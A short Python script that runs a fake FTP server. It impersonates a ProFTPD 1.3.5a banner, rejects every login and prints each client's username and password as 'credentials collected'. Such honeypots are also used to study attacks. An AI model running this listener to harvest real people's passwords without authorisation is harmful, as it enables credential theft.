#!/usr/bin/env python3

import asyncio
import click
import os
import pwd


def drop_privileges():

    if os.getuid() != 0:
        return

    if 'SUDO_UID' not in os.environ:
        return

    pwnam = pwd.getpwuid(int(os.environ['SUDO_UID']))

    print('Dropping privileges and going to user', pwnam.pw_name)

    # Remove group privileges
    os.setgroups([])

    # Try setting the new uid/gid
    os.setgid(pwnam.pw_gid)
    os.setuid(pwnam.pw_uid)

    # Ensure a reasonable umask
    old_umask = os.umask(0o22)

    return True


class FTPServer(asyncio.Protocol):


    def connection_made(self, transport):
        self.transport = transport
        self.username = None
        self.password = None
        self.valid_cmds = ['USER', 'PASS']
        self.address = transport.get_extra_info('peername')
        self.transport.write(b'220 ProFTPD 1.3.5a Server (ProFTPD Server)\n')
        print('Accepted connection from {}'.format(self.address))


    def data_received(self, data):
        #self.transport.write(data)

        cmd = data.decode().split(' ')[0].strip().upper()

        if cmd not in self.valid_cmds:
            self.transport.write('500 {} not understood\n'.format(cmd).encode())
            return True

        if cmd == 'USER':
            username = data.decode().split(' ')[1].strip()
            if username:
                self.username = username
                self.transport.write('331 Password required for {}\n'.format(username).encode())
            else:
                self.transport.write('500 USER: command requires a parameter\n'.encode())

            return True

        if cmd == 'PASS':
            password = data.decode().split(' ')[1].strip()
            if not self.username:
                self.transport.write(b'530 Please login first\n')
                return True

            if not password:
                self.transport.write(b'530 Login incorrect.\n')
                return True

            self.password = password
            self.transport.write(b'530 Login incorrect.\n')

            if self.username.lower() == 'anonymous':
                print('Anonymous login.')
            else:
                print('Credentials collected from {}! {} {}'.format(self.address[0], self.username, self.password))

            return True


    def connection_lost(self, exc):
        if exc:
            print('Client {} error: {}'.format(self.address, exc))
        else:
            print('Client {} closed socket'.format(self.address))


@click.command()
@click.option('-a', 'address', default=None, help='Address to bind (default: all)')
@click.option('-p', 'port', default=21, help='Which port to use (default: 21)')
@click.option('-v', 'verbose', is_flag=True, default=False, help='Verbose')
def cmd_ftpd(address, port, verbose):

    loop = asyncio.get_event_loop()
    coro = loop.create_server(FTPServer, host=address, port=port, reuse_address=True, reuse_port=True)
    server = loop.run_until_complete(coro)
    drop_privileges()

    print('Listening on port {}'.format(port))

    try:
        loop.run_forever()
    finally:
        server.close()

    loop.close()

if __name__ == '__main__':
    cmd_ftpd()

